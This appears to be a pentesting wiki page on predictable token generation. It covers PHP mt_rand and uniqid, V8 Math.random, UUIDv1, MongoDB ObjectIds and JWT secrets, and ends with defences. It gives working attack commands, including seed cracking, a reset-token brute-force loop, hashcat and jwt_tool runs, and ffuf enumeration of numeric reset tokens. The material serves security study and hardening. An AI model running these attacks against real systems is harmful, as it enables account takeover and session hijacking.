---
title: Weak randomness and token generation
slug: weak-token-generation
aliases: [weak tokens, predictable tokens, insecure randomness, token prediction, PRNG attacks]
---

> **TL;DR:** When apps generate session tokens, password-reset links, API keys, or CSRF tokens from weak PRNGs or predictable seeds (timestamps, PIDs, sequential IDs), attackers can predict or brute-force them — leading to account takeover, auth bypass, and session hijacking.

## What it is
Secure token generation requires a cryptographically secure PRNG (CSPRNG). Developers frequently reach for fast, non-cryptographic alternatives — `Math.random()`, `mt_rand()`, `time()`, `uniqid()`, UUIDv1 — whose output is deterministic given the seed. Recovering the seed (often a timestamp or PID) lets an attacker reproduce every token the application generates.

## Preconditions / where it applies
- Password reset tokens, email verification links, OTP codes
- Session IDs, CSRF tokens, API keys, invite codes
- JWT secrets derived from weak entropy
- Any token visible to the attacker (in URL, response body, cookie) that gates a privileged action

## Technique

### 1 — PHP `mt_rand()` / `mt_srand()` seed recovery
PHP's Mersenne Twister is seeded with a 32-bit value. Given a single known output, `php_mt_seed` brute-forces the seed in minutes:

```bash
# compile php_mt_seed
git clone https://github.com/openwall/php_mt_seed
cd php_mt_seed && make

# if you know mt_rand() returned 1234567890 (no range):
./php_mt_seed 1234567890

# if you know mt_rand(1, 1000000) returned 487231:
./php_mt_seed 487231 487231 1 1000000
```

Once the seed is recovered, replay `mt_srand($seed)` and call `mt_rand()` the same number of times to predict future tokens. Works for any code that seeds once per request (PHP default before 7.1 auto-seeds).

### 2 — PHP `uniqid()` weakness
`uniqid()` returns `<seconds_hex><microseconds_hex>` — purely timestamp-based, no randomness:

```php
uniqid()          // "6554a3f1e4b12" — hex(time).hex(usec)
uniqid('', true)  // adds more microsecond precision but still no entropy
```

Attack: capture the approximate time the token was generated (from `Date` response header), brute-force the microsecond component (~1M possibilities).

### 3 — JavaScript `Math.random()` prediction
`Math.random()` uses xorshift128+ in V8 (Chrome/Node.js). Given two consecutive outputs, the internal state can be recovered and all future/past values predicted:

```bash
# z3-based solver (v8_rand_buster)
# supply two sequential Math.random() outputs as doubles
python3 v8_rand_buster.py 0.6270708843498938 0.7255394259498498
```

Any token built from `Math.random()` (e.g., `Math.random().toString(36).substr(2)`) is predictable.

### 4 — Time-based tokens
```python
# if reset token = md5(email + timestamp)
import hashlib, time
for t in range(int(time.time()) - 300, int(time.time()) + 1):
    token = hashlib.md5(f"victim@email.com{t}".encode()).hexdigest()
    # try each token against the reset endpoint
```

Narrow the window using the `Date` header from the response that triggered the token generation. See [[ssrf]] for time-sync techniques.

### 5 — UUID v1 prediction
UUIDv1 embeds timestamp (60-bit, 100ns granularity) + MAC address + clock sequence:

```
550e8400-e29b-11d4-a716-446655440000
|______| |__| |__| |__| |__________|
 time_lo  mid  hi   clk    MAC
```

Attack: if you can observe one UUIDv1, you know the MAC and clock sequence. Brute-force timestamps around the target event window. Tools: `uuid_tool`, manual parsing.

UUIDv4 uses 122 random bits from CSPRNG — not predictable. Always check which version is in use.

### 6 — MongoDB ObjectId prediction
ObjectId = `<4-byte timestamp><5-byte random><3-byte counter>`:

```
507f1f77bcf86cd799439011
|______| |________| |____|
  time     machine    ctr
```

The random component is fixed per process. If you can observe one ObjectId from the same process, the counter increments predictably — enumerate neighbouring IDs. See [[idor]].

### 7 — JWT weak secret brute-force
```bash
# hashcat — mode 16500 for JWT HS256/HS384/HS512
hashcat -m 16500 jwt.txt wordlist.txt

# jwt_tool — test known weak secrets + wordlist
python3 jwt_tool.py <token> -C -d wordlist.txt

# jwt_tool — test algorithm confusion (RS256 → HS256)
python3 jwt_tool.py <token> -X k -pk public.pem
```

See [[jwt-attacks]] for full JWT attack taxonomy (none alg, key confusion, JWK injection).

### 8 — Sequential / short tokens
Reset tokens like `?token=48293` or `?token=A4F2` have trivially small keyspaces. Brute-force directly:

```bash
# ffuf to enumerate 6-digit numeric reset tokens
ffuf -u "https://target.com/reset?token=FUZZ" -w <(seq -w 000000 999999) \
     -mc 200 -fs <error_page_size>
```

Rate-limiting and account lockout are the only server-side defences for short tokens.

## Detection and defence
- Use CSPRNG exclusively: `secrets` (Python), `random_bytes()` / `random_int()` (PHP 7+), `crypto.randomBytes()` (Node.js), `SecureRandom` (Java/Ruby)
- Tokens should be at least 128 bits of entropy, hex- or base64-encoded
- Bind tokens to the account and action; expire after single use or short TTL
- Use UUIDv4, never UUIDv1, for security-sensitive identifiers
- Rate-limit and lock out token-verification endpoints
- Hash tokens at rest (e.g., store `SHA-256(token)`, send `token` in the link)
- JWT: use RS256/ES256 with proper key management; never HS256 with a guessable secret

See also [[jwt-attacks]], [[idor]], [[session-management]], [[password-reset-poisoning]].

## References
- [PortSwigger — Insecure randomness](https://portswigger.net/web-security/authentication/other-mechanisms) — lab walkthroughs
- [php_mt_seed](https://github.com/openwall/php_mt_seed) — Mersenne Twister seed cracker
- [HackTricks — Brute-force password reset tokens](https://book.hacktricks.wiki/en/pentesting-web/reset-password.html) — token prediction patterns
- [PayloadsAllTheThings — JWT](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token) — JWT attack cheatsheet
